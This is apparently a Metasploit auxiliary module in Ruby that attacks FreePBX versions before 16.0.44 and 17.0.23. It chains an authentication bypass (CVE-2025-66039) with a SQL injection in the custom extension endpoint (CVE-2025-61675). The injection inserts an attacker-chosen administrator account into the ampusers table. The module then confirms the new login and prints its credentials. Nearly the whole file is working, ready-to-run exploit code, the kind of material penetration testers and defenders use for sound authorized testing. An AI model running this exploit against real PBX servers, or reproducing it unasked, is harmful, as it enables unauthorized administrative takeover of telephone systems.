##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreePBX Custom Extension SQL Injection',
        'Description' => %q{
          FreePBX versions prior to 16.0.44 and 17.0.23 are vulnerable to multiple CVEs, specifically CVE-2025-66039 and CVE-2025-61675, in the context of this module. The former represents an authentication bypass: when FreePBX uses Webserver Authorization Mode (an option the admin can enable), it allows an attacker to authenticate as any user. The latter CVE describes multiple SQL injections; this module exploits the SQL injection in the custom extension component. The module chains these vulnerabilities into an unauthenticated SQL injection attack that creates a new fake user and effectively grants an attacker access to the administration.
        },
        'Author' => [
          'Noah King', # research
          'msutovsky-r7', # module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2025-66039'], # Authentication Bypass
          [ 'CVE', '2025-61675']  # SQL injections
        ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptString.new('USERNAME', [true, 'The valid FreePBX user', 'admin']),
      OptString.new('FAKE_USERNAME', [false, 'Username for inserted user']),
      OptString.new('FAKE_PASSWORD', [false, 'Password for inserted user']),
    ])
  end

  def get_referer
    protocol = ssl ? 'https' : 'http'

    return "#{protocol}://#{datastore['rhosts']}" if rport == 80

    "#{protocol}://#{datastore['rhosts']}:#{datastore['rport']}"
  end

  def run
    username = datastore['FAKE_USERNAME'] || Rex::Text.rand_text_alphanumeric(rand(4..10))
    password = datastore['FAKE_PASSWORD'] || Rex::Text.rand_text_alphanumeric(rand(6..12))

    print_status('Trying to create new fake user')
    res = custom_extension_injection(username, Digest::SHA1.hexdigest(password))

    fail_with(Failure::PayloadFailed, 'Failed to create fake user') unless res&.code == 401

    if valid_creds?(username, password)
      print_good("New admin account: #{username}/#{password}")
    else
      print_error('Failed to create new user')
    end
  end

  def valid_creds?(username, password)
    res = send_request_cgi({
      'uri' => normalize_uri('admin', 'ajax.php'),
      'method' => 'POST',
      'vars_get' => {
        'module' => 'userman',
        'command' => 'checkPasswordReminder'
      },
      'headers' => { Referer: "#{get_referer}/admin/config.php" },
      'vars_post' => {
        'username' => username,
        'password' => Rex::Text.encode_base64(password),
        'loginpanel' => 'admin'
      }
    })

    return false unless res&.code == 200

    json_data = res.get_json_document

    return false unless json_data['status'] == true && json_data['message'] == '' && json_data['usertype'] == 'admin'

    true
  end

  def custom_extension_injection(username, password)
    send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'POST',
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6))
      },
      'vars_get' => {
        'display' => 'endpoint',
        'view' => 'customExt'
      },
      'vars_post' => {
        'id' => %<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password}', 0x2a)#>
      }
    })
  end

end
